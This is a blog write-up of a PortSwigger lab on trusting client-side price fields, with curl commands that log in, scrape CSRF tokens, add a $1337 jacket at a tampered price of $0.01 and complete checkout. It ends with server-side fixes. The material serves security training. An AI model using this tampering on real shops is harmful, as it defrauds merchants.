---
layout: post
title: "PortSwigger: Excessive Trust in Client-Side Controls"
date: 2027-10-15 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, BusinessLogic]
tags: [portswigger, business-logic, price-tampering, client-side-controls, parameter-tampering, e-commerce, cwe-602]
---

A shop refuses to sell you a $1337 jacket because you only have $100 of credit. But the price you "can't afford" is a number your own browser hands the server in the add-to-cart request — and the server believes it. Change the number, buy the jacket for a penny. This is [CWE-602](https://cwe.mitre.org/data/definitions/602.html) (Reliance on Untrusted Client-Side Controls), the price-tampering flavour of a business-logic flaw.

## Overview

The lab is an online store. Log in as `wiener:peter` and you have **$100** of store credit. The "Lightweight l33t Leather Jacket" (`productId=1`) costs **$1337**, so checkout is rejected — not enough credit.

The interesting part is *how* the cart learns the price. When you add an item, the browser sends:

```
POST /cart
productId=1&redir=PRODUCT&quantity=1&price=...
```

The `price` is in the request. The server already knows what `productId=1` costs — it's in the catalog — yet it records whatever price the browser sends. That trust is the bug.

## Tamper the price

Log in and keep the session cookie, then add the jacket with a price of `1`. The price is in **minor units**, so `1` means **$0.01**:

```bash
# log in (wiener:peter)
csrf=$(curl -sk -c cookies.txt 'https://<lab-id>.web-security-academy.net/login' \
        | grep -oP 'name="csrf" value="\K[^"]+')
curl -sk -b cookies.txt -c cookies.txt \
  -d "csrf=$csrf&username=wiener&password=peter" \
  'https://<lab-id>.web-security-academy.net/login'

# add the $1337 jacket to the cart, but tell the server it costs $0.01
curl -sk -b cookies.txt -c cookies.txt \
  -d "productId=1&redir=PRODUCT&quantity=1&price=1" \
  'https://<lab-id>.web-security-academy.net/cart'
```

Refresh the cart and the jacket is now listed at **$0.01** — the server kept our number.

## Check out

The checkout form carries its own CSRF token (separate from the login one). Scrape it from `/cart`, then post the checkout:

```bash
ccsrf=$(curl -sk -b cookies.txt 'https://<lab-id>.web-security-academy.net/cart' \
         | grep -oP 'name="csrf" value="\K[^"]+' | head -1)

curl -sk -b cookies.txt -D - -o /dev/null \
  -d "csrf=$ccsrf" \
  'https://<lab-id>.web-security-academy.net/cart/checkout'
#   -> HTTP/2 303
#   -> location: /cart/order-confirmation?order-confirmed=true
```

That `303` to `order-confirmation?order-confirmed=true` is the order going through. A $1337 jacket bought for one penny, comfortably under the $100 limit. The lab status flips to **Solved**.

> Gotcha worth flagging: the cart's checkout CSRF token regenerates and the cart page goes blank after an order completes. Grab the token *after* re-adding the item, not before — otherwise you scrape an empty string and the checkout answers `400 Missing parameter 'csrf'`.

## Why it worked

The price of an item is a value the **server owns** — it lives in the product catalog. By accepting it from a request field, the application delegated a security-relevant decision (how much money changes hands) to the client, which the attacker controls completely. An HTTP request is just text; `readonly` fields, `maxlength` attributes, and JavaScript validation live in the browser and never constrain what we actually send on the wire.

This generalises well beyond price:

- **Quantity** — a negative quantity can credit the attacker instead of charging them.
- **Discount / coupon amount** — if the discount value rides in the request, set it to whatever you like.
- **Shipping or currency fields** — same story, anything the client supplies and the server trusts.

Whenever a value that determines money or entitlement appears in a request the user can edit, ask: *should the server have computed this itself?* If yes, it's a candidate for tampering.

## The fix

Never trust price, quantity sign, discount, or totals from the client. At checkout, rebuild the order total server-side from authoritative catalog data keyed by `productId`:

```js
app.post('/cart', (req, res) => {
  const item = catalog.get(req.body.productId);  // authoritative price
  cart.add(item.id, item.price);                 // ignore any client-sent price
});
```

- **Recompute the total at checkout** from server-stored line items, and reject any client-supplied total that disagrees.
- **Validate quantities** as positive integers with sensible per-item caps.
- **Apply discounts from a server-side rules engine**, not from a request parameter.
- Treat all client-side validation as UX only — it never replaces a server-side check.
